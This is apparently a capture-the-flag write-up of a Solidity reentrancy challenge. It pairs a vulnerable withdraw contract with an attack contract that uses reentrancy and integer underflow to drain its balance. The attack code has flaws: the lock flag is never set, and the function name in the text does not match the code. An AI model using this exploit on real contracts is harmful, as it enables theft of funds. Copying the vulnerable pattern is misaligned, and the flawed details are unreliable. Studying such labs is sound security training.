**Description**

This challenge has 2 different vulnerabilities that we are going to use: , first one is reentrancy, and the second one is an `integer underflow`. Looking at the source code, the first naive solution would be to just keep calling the withdraw function from the `receive` function since it's the one provoked when receiving ETH, but that would consume a lot of resources, so we are going to use the `integer underflow` in our profit.

* Reentrance.sol
```solidity=
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public constant returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() payable {}
}
```

**Attack Scenario**
First, we are going to implement our attack contract, which will look something like this:

- **Attack.sol**
```
pragma solidity 0.8.0;

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    bool public    lock;
    function deposit() external payable
    {
        IReentrancy(0x8e992b3203725385bCD2FA89a5d9eB64C8983F75).donate{value: 100}(address(this));
    }
    function attackhh() external
    {
        lock = false;
        IReentrancy(0x8e992b3203725385bCD2FA89a5d9eB64C8983F75).withdraw(100);
    }

    function withdrawAll() external {
        IReentrancy(0x8e992b3203725385bCD2FA89a5d9eB64C8983F75).withdraw(address(0x8e992b3203725385bCD2FA89a5d9eB64C8983F75).balance);
    }
    receive() payable external{
        if (!lock)
            IReentrancy(0x8e992b3203725385bCD2FA89a5d9eB64C8983F75).withdraw(100);
        lock = false;
    }

    function withdraw() external
    {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

We will first call the `deposit` function to add ether to our balance, then the `attack` function, which will then try to withdraw from the `Reentrance`. The `Reentrance` will then provoke the `receive` method, which will then call the `withdraw` from the `Reentrance`. Now the amount will be subtracted twice from the balance, causing an integer underflow, so we will now call the `withdrawAll` function to withdraw.